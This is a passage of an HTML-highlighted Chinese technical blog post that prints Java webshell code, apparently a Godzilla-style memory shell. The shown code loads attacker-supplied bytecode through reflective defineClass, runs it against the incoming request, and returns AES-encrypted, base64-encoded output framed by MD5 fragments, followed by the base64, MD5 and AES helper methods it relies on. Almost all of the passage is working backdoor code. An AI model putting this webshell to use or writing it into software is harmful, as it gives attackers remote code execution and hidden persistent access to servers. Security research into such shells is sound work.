&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">defMethod&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">urlClassLoader&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">arrOut&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">arrOut&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getWriter&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">md5&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">substring&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getWriter&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">base64Encode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">arrOut&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">xc&lt;/span>&lt;span style="color:#f92672">)));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getWriter&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">md5&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">substring&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>涉及到的几个编码工具方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">base64Decode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">bs&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">base64&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.util.Base64&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">decoder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getDecoder&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[])&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[])&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[])((&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[])&lt;/span>&lt;span style="color:#111">decoder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;decode&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">decoder&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">bs&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">base64&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sun.misc.BASE64Decoder&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">decoder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[])((&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[])&lt;/span>&lt;span style="color:#111">decoder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;decodeBuffer&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">decoder&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">bs&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">base64Encode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">bs&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">base64&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.util.Base64&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">Encoder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getEncoder&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[])&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[])&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">Encoder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;encodeToString&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Encoder&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">bs&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">base64&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sun.misc.BASE64Encoder&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">Encoder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">Encoder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;encode&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Encoder&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">bs&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">ret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">MessageDigest&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">MessageDigest&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;MD5&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">update&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BigInteger&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">digest&lt;/span>&lt;span style="color:#f92672">())).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">toUpperCase&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">ret&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">xc&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Cipher&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Cipher&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;AES&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">init&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">SecretKeySpec&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">xc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#d88200">&amp;#34;AES&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">doFinal&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
